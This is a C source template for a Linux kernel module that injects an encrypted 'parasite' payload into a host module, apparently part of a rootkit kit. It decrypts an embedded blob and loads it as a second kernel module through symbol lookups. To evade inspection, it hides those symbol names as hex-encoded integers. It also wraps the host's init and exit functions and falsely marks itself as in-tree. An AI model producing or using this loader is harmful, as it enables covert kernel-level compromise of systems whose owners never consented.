#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>

#ifndef user_addr_max
#define user_addr_max() (current_thread_info()->addr_limit.seg)
#endif

#include "encrypt/encrypt.h"

#define SYS_INIT_MODULE ({ \
	unsigned int *p = __builtin_alloca(16); \
	p[0] = 0x5f737973; \
	p[1] = 0x74696e69; \
	p[2] = 0x646f6d5f; \
	p[3] = 0x00656c75; \
	(char *)p; \
})

#define SYS_DELETE_MODULE ({ \
	unsigned int *p = __builtin_alloca(24); \
	p[0] = 0x5f737973; \
	p[1] = 0x656c6564; \
	p[2] = 0x6d5f6574; \
	p[3] = 0x6c75646f; \
	p[4] = 0x00000065; \
	p[5] = 0x00000000; \
	(char *)p; \
})

#define __DO_SYS_DELETE_MODULE ({ \
	unsigned int *p = __builtin_alloca(24); \
	p[0] = 0x6f645f5f; \
	p[1] = 0x7379735f; \
	p[2] = 0x6c65645f; \
	p[3] = 0x5f657465; \
	p[4] = 0x75646f6c; \
	p[5] = 0x0000656c; \
	(char *)p; \
})


#define __DO_SYS_INIT_MODULE ({ \
	unsigned int *p = __builtin_alloca(24); \
	p[0] = 0x6f645f5f; \
	p[1] = 0x7379735f; \
	p[2] = 0x696e695f; \
	p[3] = 0x6f6d5f74; \
	p[4] = 0x656c7564; \
	p[5] = 0x00000000; \
	(char *)p; \
})

static char parasite_blob[] = {
#include "%%EFILE%%"
};

static int ksym_lookup_cb(unsigned long data[], const char *name, void *module, unsigned long addr){
	int i = 0;
	while(!module && (((const char *)data[0]))[i] == name[i])
		if (!name[i++])
			return !!(data[1] = addr);
	return 0;
}

static inline unsigned long ksym_lookup_name(const char *name){
	unsigned long data[2] = {(unsigned long)name, 0};
	kallsyms_on_each_symbol((void *)ksym_lookup_cb, data);
	return data[1];
}

extern int __init %%INIT_FUNC%%(void);
extern int __exit %%EXIT_FUNC%%(void);

int __init %%INIT_FUNC_NAME%%(void){
	asmlinkage long (*sys_init_module)(const void *, unsigned long, const char *) = NULL;
	%%INIT_FUNC%%();
	do_decrypt(parasite_blob, sizeof(parasite_blob), DECRYPT_KEY);
	sys_init_module = (void *)ksym_lookup_name(SYS_INIT_MODULE);
	if(!sys_init_module)
		sys_init_module = (void *)ksym_lookup_name(__DO_SYS_INIT_MODULE);
	if(sys_init_module){
		const char *nullarg = parasite_blob;
		unsigned long seg = user_addr_max();
		while(*nullarg)
			nullarg++;
		user_addr_max() = roundup((unsigned long)parasite_blob + sizeof(parasite_blob), PAGE_SIZE);
		sys_init_module(parasite_blob, sizeof(parasite_blob), nullarg);
		user_addr_max() = seg;
	}
	return 0;
}

void __exit %%EXIT_FUNC_NAME%%(void){
	asmlinkage long (*sys_delete_module)(const char __user *, unsigned int);
	sys_delete_module = (void *)ksym_lookup_name(SYS_DELETE_MODULE);
	if(!sys_delete_module)
		sys_delete_module = (void *)ksym_lookup_name(__DO_SYS_DELETE_MODULE);
	if(sys_delete_module)
		sys_delete_module(parasite_blob, 00004000);
	%%EXIT_FUNC%%();
	return;
}

MODULE_LICENSE("GPL");
MODULE_INFO(intree, "Y");
